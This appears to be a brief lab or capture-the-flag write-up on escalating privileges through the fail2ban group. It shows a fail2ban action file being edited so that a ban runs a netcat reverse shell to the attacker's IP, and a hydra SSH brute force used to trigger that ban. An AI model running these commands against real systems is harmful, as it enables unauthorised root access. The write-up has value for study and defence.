- Initial access was taken using rsync. and the steps are as below
[[RSYNC]]
- After doing the SSH and issuing id command noticed an odd group in the user called fail2ban.
- After reading the below article realized that this is the PE method.
https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
- Got the config file because it was too hard to scroll and viewed it in KALI
```bash
cat /etc/fail2ban/jail.conf > /home/fox/jail
```
- Three things to check was below default values for SSH
```
maxretry
findtime
bantime
```
- Changed the line **actionban = nc -e /bin/sh 192.168.45.156 80**
```bash
nano /etc/fail2ban/action.d/iptables-multiport.conf
```

- Did a SSH bruteforce with wrong username
```bash
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt ssh://192.168.220.126
```
